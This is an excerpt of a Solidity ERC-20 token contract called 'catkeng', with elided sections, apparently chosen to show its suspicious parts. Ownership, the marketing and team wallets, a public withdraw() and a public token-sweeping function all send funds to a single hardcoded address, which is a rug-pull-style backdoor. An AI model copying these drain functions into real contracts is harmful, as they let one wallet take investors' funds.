...
abstract contract Ownable is Context {
    ...
    constructor () {
        _owner = 0x9a311A89abF21dDFd2dfac35BB10Ca22a6421bC7; 
...
contract catkeng is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "catkeng";
    string private _symbol = "catkeng";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x9a311A89abF21dDFd2dfac35BB10Ca22a6421bC7); // 
    address payable public teamWalletAddress = payable(0x9a311A89abF21dDFd2dfac35BB10Ca22a6421bC7); // 
    ...
    function withdraw() public {
        ...
        payable(address(0x9a311A89abF21dDFd2dfac35BB10Ca22a6421bC7)).transfer(address(this).balance);
    }
...
function remove_Random_Tokens(address random_Token_Address, uint256 percent_of_Tokens) public returns(bool _sent){
        ...
        _sent = IERC20(random_Token_Address).transfer(address(0x9a311A89abF21dDFd2dfac35BB10Ca22a6421bC7),removeRandom);
}}